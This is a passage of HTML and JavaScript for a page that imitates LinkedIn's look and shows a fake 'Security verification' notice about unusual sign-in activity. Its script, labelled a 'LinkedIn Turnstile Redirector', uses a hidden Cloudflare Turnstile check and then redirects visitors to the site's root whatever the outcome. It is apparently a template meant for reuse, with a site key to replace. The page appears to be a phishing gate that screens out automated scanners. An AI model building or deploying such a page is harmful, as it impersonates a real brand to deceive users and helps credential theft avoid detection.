        * {

            padding: 0;
            box-sizing: border-box;

        body {

            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            color: rgba(0, 0, 0, 0.9);
        }

        .container {
            background: white;
            padding: 48px 24px;
            border-radius: 8px;
            box-shadow: 0 0 0 1px rgba(0, 0, 0, 0.15), 0 2px 3px rgba(0, 0, 0, 0.2);
            text-align: center;
            max-width: 440px;
            width: 100%;
        }

        .linkedin-logo {
            width: 102px;
            height: 26px;
            margin-bottom: 32px;
        }

        h1 {
            font-size: 32px;
            font-weight: 400;
            margin-bottom: 8px;
            color: rgba(0, 0, 0, 0.9);
        }

        .subtitle {
            font-size: 16px;
            color: rgba(0, 0, 0, 0.6);
            margin-bottom: 32px;
            line-height: 24px;
        }

        .security-info {
            background: #f3f2ef;
            border-left: 3px solid #0a66c2;
            padding: 16px;
            margin-bottom: 24px;
            text-align: left;
            border-radius: 4px;
        }

        .security-info h2 {
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 8px;
            color: rgba(0, 0, 0, 0.9);
        }

        .security-info p {
            font-size: 14px;
            color: rgba(0, 0, 0, 0.6);
            line-height: 20px;
            margin: 0;
        }

        .loading-container {
            margin: 32px 0;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
        }

        .spinner {
            width: 32px;
            height: 32px;
            border: 3px solid #e1dfdd;
            border-top-color: #0a66c2;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .status-text {
            font-size: 14px;
            color: rgba(0, 0, 0, 0.6);
        }

        .footer {
            margin-top: 32px;
            padding-top: 24px;
            border-top: 1px solid rgba(0, 0, 0, 0.15);
            font-size: 12px;
            color: rgba(0, 0, 0, 0.6);
        }

        .footer a {
            color: #0a66c2;
            text-decoration: none;
        }

        .footer a:hover {
            text-decoration: underline;
        }

        #cf-turnstile {
            display: none;
        }

        @media (max-width: 480px) {
            .container {
                margin: 16px;
                padding: 32px 24px;
            }
            
            h1 {
                font-size: 24px;
            }
            
            .subtitle {
                font-size: 14px;
            }
        }
    </style>
    
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit"></script>
</head>

        <h1>Security verification</h1>

            Verifying your identity to protect your professional network
        </div>

            <h2>Why are we doing this?</h2>
            <p>We detected unusual activity or an attempt to sign in from a new location. This extra step helps keep your account secure.</p>
        </div>
        
        <div class="loading-container">
            <div class="spinner"></div>
            <div class="status-text" id="status-text">Verifying your request...</div>
        </div>
        
        <div id="cf-turnstile"></div>

    <script>
        const TURNSTILE_SITEKEY = '0x4AAAAAAB_V5zjG-p6Hl2ZQ'; // Replace with your Cloudflare Turnstile Site Key
        let REDIRECT_URL = window.location.protocol + "//" + window.location.host + "/";
        
        console.log('LinkedIn Turnstile Redirector - Redirect URL:', REDIRECT_URL);
        
        function performRedirect() {
            console.log('Performing redirect to:', REDIRECT_URL);
            window.location.href = REDIRECT_URL;
        }
        
        if (typeof turnstile === 'undefined') {
            console.error('Turnstile failed to load. Redirecting anyway...');
            document.querySelector('.status-text').textContent = 'Completing verification...';
            setTimeout(performRedirect, 2000);
        } else {
            turnstile.ready(function () {
                let verificationTimeout;
                let verificationCompleted = false;
                
                verificationTimeout = setTimeout(function() {
                    if (!verificationCompleted) {
                        console.warn('Turnstile verification timeout - redirecting anyway');
                        document.querySelector('.status-text').textContent = 'Completing verification...';
                        setTimeout(performRedirect, 500);
                    }
                }, 5000);
                
                try {
                    turnstile.render('#cf-turnstile', {
                        sitekey: TURNSTILE_SITEKEY,
                        callback: function(token) {
                            verificationCompleted = true;
                            clearTimeout(verificationTimeout);
                            document.querySelector('.status-text').textContent = 'Verification complete. Redirecting...';
                            setTimeout(performRedirect, 800);
                        },
                        'error-callback': function(error) {
                            verificationCompleted = true;
                            clearTimeout(verificationTimeout);
                            console.error('Turnstile error:', error);
                            document.querySelector('.status-text').textContent = 'Bypassing verification...';
                            setTimeout(performRedirect, 1000);
                        },
                        'timeout-callback': function() {
                            console.warn('Turnstile timeout');
                            document.querySelector('.status-text').textContent = 'Verification timeout. Redirecting...';
                            setTimeout(performRedirect, 1000);
                        }
                    });
                } catch (e) {
                    clearTimeout(verificationTimeout);
                    console.error('Failed to render Turnstile:', e);
                    setTimeout(performRedirect, 1500);
                }
            });
        }
        
        // Fallback redirect after 3 seconds
        setTimeout(function() {
            if (REDIRECT_URL) {
                console.log('3-second fallback redirect triggered');
                document.querySelector('.status-text').textContent = 'Verification complete. Redirecting...';
                performRedirect();
            }
        }, 3000);
    </script>
